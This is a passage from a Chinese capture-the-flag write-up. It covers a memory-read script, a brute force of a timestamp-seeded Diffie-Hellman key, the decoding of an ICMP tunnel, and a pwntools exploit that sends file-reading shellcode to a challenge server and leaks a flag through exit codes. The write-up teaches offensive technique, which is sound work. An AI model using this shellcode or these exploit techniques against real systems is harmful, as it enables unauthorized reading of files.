        # print 'send offset',hex(a)
        data = read8(content,a)
        print data
        # data = data.decode('hex')
        return data 
    # '''
    table_data_offset = 0x80
    data_offset = u64(offset(table_data_offset))+528
    table_data_size = 0x98
    data_size = u64(offset(table_data_size))-528-1
    data_size = data_size+0x40
    print data_size/0x60,data_size%0x60
    r = data_size/0x60
    l = 0
    m = (l+r)/2
    while True:
        data = offset(data_offset+m*0x60+0x20)
        print m,data
        if '\x00' in data:
            r = m
        else:
            l = m
        m = (l+r)/2
        if '}' in data:
            break
    # while True:
    print offset(data_offset+m*0x60+0x20-8)
    print offset(data_offset+m*0x60+0x20-16)
    print offset(data_offset+m*0x60+0x20-24)
    print offset(data_offset+m*0x60+0x20-32)
得到flag : EIS{need_to_know_123_before_hacking_lol}
### YouChat
dh前向安全性密钥交换算法，通常情况来看即使获得通讯数据也无法获得会话密钥。  
但是题目中的随机数使用了当前时间戳，并且流量中有 HTTP 流量，即可获得服务器时间，从服务器时间附近开始爆破密钥，爆破后解密密文即可。
    from Crypto.Cipher import AES
    n1 = 2788345359890551962905543699268136771176146000595129094648687559760519824698082876750649883170679922128843046651835660067369815643046909474111978619841667476365660977739880668233159866349478217053419208643682425092527541427901937121285804453341270303876060899970827193040944247320434441820601552072772196631
    module = 178922502641382884719655444473401202320992695012776499435228267035240519083789199752508747615390185778922172217091588694375036275788509347056710981158505765839784659343157937299004903271202878247597396606459115904969445633597329631641132639838853464328381065150951561416618657054418909973015950955119221913709
    base = 65537
    n2 = 122909506930720148822026880183728012525703992834932769580248844377225531647180931058151093428767439482846732968693811513424900749181859575037932026377525177691863042999954304430740868140773963404578870118560546364210827023511095073900617051661314244461840751860152430809513488211355892785320736409017285674252
    enc = "Z5x2stZPTMLCdUwBZcw0uwDVMaLDS1xME7+JwmeUYZb4jep2HZBF1V0IKwDL4Vse"
    def newaes(key):
        aes_key = 0
        while key > 0:
            aes_key ^= key & (2 ** 256 - 1)
            key >>= 256
        try:
            aes_key = ('%x' % aes_key).strip('L').decode('hex')
        except:
            aes_key = ('0%x' % aes_key).strip('L').decode('hex')
        aes = AES.new(aes_key, AES.MODE_CBC, '0' * 16)
        return aes
    def dec(key,encmsg):
        msg = newaes(key).decrypt(encmsg.strip().decode('base64'))
        return msg[:-ord(msg[-1])]
    start = 1537005600
    i = start
    while True:
        i -= 1
        if i % 10000 ==0:
            print i
        if n1 == pow(base, i * 0xdeadbeef, module):
            print i
            break
    # i = 1537004467
    nonce = i * 0xdeadbeef
    key = pow(n2, nonce, module)
    enc = "Z5x2stZPTMLCdUwBZcw0uwDVMaLDS1xME7+JwmeUYZb4jep2HZBF1V0IKwDL4Vse"
    print dec(key, enc)
### GoGoGo
观察数据包发现大量异常ICMP包, 观察发现为ICMP Tunnel, 解包ICMP后发现通过ftp下载了gogogo.png。
    import dpkt
    f = open('test.pcap', 'rb')
    pcap = dpkt.pcap.Reader(f)
    out = open('in.pcap', 'wb')
    writer = dpkt.pcap.Writer(out)
    for ts, buf in pcap:
        eth = dpkt.ethernet.Ethernet(buf)
        ip = eth.data
        icmp = ip.data
        payload = icmp.data
        eth.data = str(payload)[4:]
        writer.writepkt(eth)
    f.close()
    out.close()
### ShellcodEncrypt
题目放出提示`the encryption is the
decryption`所以猜测加密和解密是同一个函数，所以经过多次手动尝试和猜测，发现加密的单位是dword，而以此输入的时候qword，再多次尝试得到
    int a,b;
    int c,d = crypto(a + b)
    crypto(d + c) == b + a
从上面的逻辑可以看出，最开始的时候将明文交换加密之后，再次交换解密解密就好。  
然而这题服务器上给的binary每次连接都不一样（还要感谢出题人提醒），但是巧合的是我发现main函数的地址始终不会发生变化，然后我选择patch程序，让程序直接将加密之后的数据输出，然后交换后，发给服务端。  
这题每次输出的是程序的返回值，这样将flag的每个字符，通过exit一字节一字节输出就可以了。
  * patch
    from pwn import *
    def patch(pt):
        seccomp = pt.inject(c = r'''
    #define SYS_write "1"
    #define SYS_exit "60"
    static int exit(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5);
    static int write(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5);
    void seccomp(char * buf){
        write(1, buf, 0x80, 0, 0);
        exit(0, 2, 0, 0, 0);
        return;
    }
    static int write(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5)
    {
        int ret;
        __asm__ __volatile__ ("mov $" SYS_write ", %%rax\n\t"
            "movl %1, %%edi\n\t"
            "movq %2, %%rsi\n\t"
            "movq %3, %%rdx\n\t"
            "movq %4, %%r10\n\t"
            "movq %5, %%r8\n\t"
            "syscall\n\t"
            :"=a"(ret)
            :"m"(option), "m"(arg2), "m"(arg3), "m"(arg4), "m"(arg5)
           );
        return ret;
    }
    static int exit(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5)
    {
        int ret;
        __asm__ __volatile__ ("mov $" SYS_exit ", %%rax\n\t"
            "movl %1, %%edi\n\t"
            "movq %2, %%rsi\n\t"
            "movq %3, %%rdx\n\t"
            "movq %4, %%r10\n\t"
            "movq %5, %%r8\n\t"
            "syscall\n\t"
            :"=a"(ret)
            :"m"(option), "m"(arg2), "m"(arg3), "m"(arg4), "m"(arg5)
           );
        return ret;
    }
            ''')
        hook_addr = 0x40059D
        pt.hook(hook_addr, seccomp)
  * exploit
    from pwn import *
    import os
    import base64
    context(arch = 'amd64', os = 'linux', endian = 'little')
    # context.log_level = 'debug'
    context.terminal = ['tmux', 'split', '-h']
    def getencryptdata(data):
        sc = data.ljust(((len(data) + 7) / 8) * 8, '\x00')
        end = ''
        for i in range(0, len(sc), 8):
            end += sc[i + 4 : i + 8] + sc[i : i + 4]
        p = process('./ShellcodEncrypt.patched')
        p.send(end)
        sc = p.recvn(0x80)
        end = ''
        for i in range(0, len(sc), 8):
            end += sc[i + 4 : i + 8] + sc[i : i + 4]
        return end
    SC = '''
        /* open(file='/home/ctf/flag', oflag=0, mode=0) */
        /* push '/home/ctf/flag\x00' */
        mov rax, 0x101010101010101
        push rax
        mov rax, 0x101010101010101 ^ 0x67616c662f66
        xor [rsp], rax
        mov rax, 0x74632f656d6f682f
        push rax
        mov rdi, rsp
        xor edx, edx /* 0 */
        xor esi, esi /* 0 */
        /* call open() */
        push SYS_open /* 2 */
        pop rax
        syscall
    push 0
        /* call read('rax', '0x1000 - 1', 2) */
        mov rdi, rax
        xor eax, eax /* SYS_read */
        push %d
        pop rdx
        xor esi, esi
        lea rsi, [rsp - %d]
        syscall
    pop rdi
        /* exit(status='rdi') */
        /* setregs noop */
        /* call exit() */
        push SYS_exit /* 0x3c */
        pop rax
        syscall
    flag = ''
    for i in range(100):
        p = remote('210.32.4.18', 13377)
        p.recvuntil('file:\n')
        with open('./ShellcodEncrypt.txt', 'w') as f:
            f.write(p.recvline()[ : -1])
        os.system('base64 -d ./ShellcodEncrypt.txt > ShellcodEncrypt')
        os.system('~/patchkit/patch ShellcodEncrypt patch.py')
        p.recvuntil('please:\n')
        shellcode = getencryptdata(asm(SC % (i + 1, i)))
        p.sendline(base64.b64encode(shellcode))
        # print p.recvline()
        p.recvuntil('is ')
        flag += chr(int(p.recvline()[ : -1]))
        print flag